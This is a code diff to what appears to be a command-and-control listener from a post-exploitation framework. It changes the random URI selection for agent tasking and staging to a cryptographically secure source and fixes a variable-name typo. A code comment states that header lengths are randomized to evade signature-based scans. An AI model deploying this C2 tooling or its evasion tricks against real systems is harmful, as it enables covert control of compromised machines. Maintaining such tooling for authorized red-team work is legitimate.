@@ -2,7 +2,7 @@ import base64
 import copy
 import logging
 import os
-import random
+import secrets
 import ssl
 import time
 import urllib.parse
@@ -144,7 +144,7 @@ class Listener:
         self.app = None
 
         # randomize the length of the default_response and index_page headers to evade signature based scans
-        self.header_offset = random.randint(0, 64)
+        self.header_offset = secrets.randbelow(65)
 
         # set the default staging key to the controller db default
         self.options["StagingKey"]["Value"] = str(
@@ -1076,20 +1076,20 @@ class ExtendedPacketHandler(PacketHandler):
 
     def send_results_for_child(self, received_data):
         self.headers['Cookie'] = "session=%s" % (received_data[1:])
-        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-        requestUri = self.server + taskURI
+        taskUri = random.SystemRandom().choice({profile.post.client.uris!s})
+        requestUri = self.server + taskUri
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
         return response
 
     def send_get_tasking_for_child(self, received_data):
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-        requestUri = self.server + taskURI
+        taskUri = random.SystemRandom().choice({profile.post.client.uris!s})
+        requestUri = self.server + taskUri
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
         return response
 
     def send_staging_for_child(self, received_data, hop_name):
-        postURI = self.server + random.sample({profile.post.client.uris!s}, 1)[0]
+        postURI = self.server + random.SystemRandom().choice({profile.post.client.uris!s})
         self.headers['Hop-Name'] = hop_name
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
         response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
@@ -1120,9 +1120,9 @@ class ExtendedPacketHandler(PacketHandler):
 
             # ==== CHOOSE URI ====
             sendMessage += (
-                "            taskUri = random.sample("
+                "            taskUri = random.SystemRandom().choice("
                 + str(profile.post.client.uris)
-                + ", 1)[0]\n"
+                + ")\n"
             )
             sendMessage += "            requestUri = self.server + taskUri\n"
 
@@ -1195,9 +1195,9 @@ class ExtendedPacketHandler(PacketHandler):
 
             # ==== CHOOSE URI ====
             sendMessage += (
-                "            taskUri = random.sample("
+                "            taskUri = random.SystemRandom().choice("
                 + str(profile.get.client.uris)
-                + ", 1)[0]\n"
+                + ")\n"
             )
             sendMessage += "            requestUri = self.server + taskUri;\n"
 
